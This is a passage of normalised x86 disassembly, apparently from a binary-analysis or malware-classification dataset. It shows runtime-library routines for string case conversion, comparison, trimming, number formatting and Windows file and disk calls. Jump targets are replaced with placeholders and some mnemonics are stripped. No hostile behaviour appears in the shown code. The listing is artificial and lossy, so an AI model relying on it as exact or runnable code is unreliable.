call sub_4026ec
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cc4
mov eax esi
pop esi
pop ebx
retn
sub_407ea0
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40270c
call ebx
pop ebx
retn
sub_407ecc
push ebx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ea0
pop ebx
retn
sub_407f04
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40436c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046f8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407f40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40436c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4046f8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f7c
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407fac
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407fcc
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408020
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407fcc
test eax eax
jne r-xdata
sub_408044
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40436c
mov ebx eax
mov eax esi
call sub_40456c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40419c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408078
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
push eax
mov eax esi
call sub_40456c
push eax
mov eax ebx
call sub_40436c
push eax
mov eax ebx
call sub_40456c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4080b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
push eax
mov eax esi
call sub_40456c
push eax
mov eax ebx
call sub_40436c
push eax
mov eax ebx
call sub_40456c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408100
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408120
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40436c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_4040ac
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4045cc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408170
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40436c
mov ebx 0x1
jmp r-xdata
cmp eax ebx
jl r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4045cc
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
inc ebx
sub_4081a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40436c
mov ebx eax
jmp r-xdata
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_4045cc
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_4081d8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40436c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40436c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_40823c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408252
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408252
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408252
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408288
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_40823c
mov edx esi
pop eax
call sub_40419c
add esp 0x10
pop esi
retn
sub_4082a8
or cl cl
jne sub_4082dc
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4082dc
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4082dc
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4082dc
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408374
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4082a8
mov edx esi
pop eax
call sub_40419c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40839c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_40823c
mov edx esi
pop eax
call sub_40419c
add esp 0x20
pop esi
retn
xor edx edx
sub_4083c4
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ce4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e5c
sub_408418
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402ce4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408438
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404ea0
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408458
mov eax [ rw-data ]
call sub_4050d0
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4050d0
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404100
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404100
sub_4084e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_4080e8
test al al
je r-xdata
sub_408524
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409770
mov edx eax
test dl dl
je r-xdata
call sub_408458
push ebp
mov eax [ rw-data ]
call sub_4050d8
mov edx eax
mov eax [ rw-data ]
call sub_4084e8
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_4050d8
mov edx eax
mov eax [ rw-data ]
call sub_4084e8
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4085c0
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404100
call sub_408458
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404100
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_404100
jmp r-xdata
pop esi
pop ebx
retn
sub_40860c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40456c
push eax
call CreateFileA
sub_408664
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40456c
push eax
call CreateFileA
pop ebx
retn
sub_408690
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086bc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408728
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_40456c
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4087a0
push ebx
push esi
mov esi eax
mov eax esi
call sub_40436c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c490
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4087d0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
mov edi eax
mov eax ebx
call sub_40456c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408a8c
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c490
cmp al 0x2
jne r-xdata
dec edi
sub_408820
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4087d0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4045cc
pop edi
pop esi
pop ebx
retn
sub_408858
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40456c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40419c
add esp 0x108
pop esi
pop ebx
retn
sub_408894
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e7c
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e7c
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408944
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_40896c
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4089a0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40436c
push eax
mov eax ebx
call sub_40456c
mov edx eax
mov eax esi
pop ecx
call sub_40896c
pop esi
pop ebx
retn
sub_4089c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40456c
mov edx eax
mov ecx edi
mov eax ebx
call sub_40896c
pop edi
pop esi
pop ebx
retn
sub_4089e4
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408a08
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408a48
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408aa0
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408b28
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408908
mov esi eax
inc esi
mov eax esi
call sub_408b08
mov ecx esi
mov edx ebx
call sub_408934
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408b64
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c4b4
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408934
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e5c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408bec
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408f43
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408cce
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408d16
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408cce
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408be0
pop edx
or edx edx
je r-xdata
sub_408cce
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408f43
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408d16
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408f43
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408b64
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408d3d ]
mov ebx ecx
sub cl 0x44
je sub_4082a8
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4042d4
jmp r-xdata
mov esi sub_404334
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4082a8
sub cl 0x44
je sub_40823c
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_40823c
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4082a8
mov ecx 0x10
cmp bl 0x58
je sub_40823c
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408bbc
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_4090fc
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_40823c
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408f64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408908
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408bec
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408fa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408908
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408bec
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408ff8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40436c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40436c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408bec
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40419c
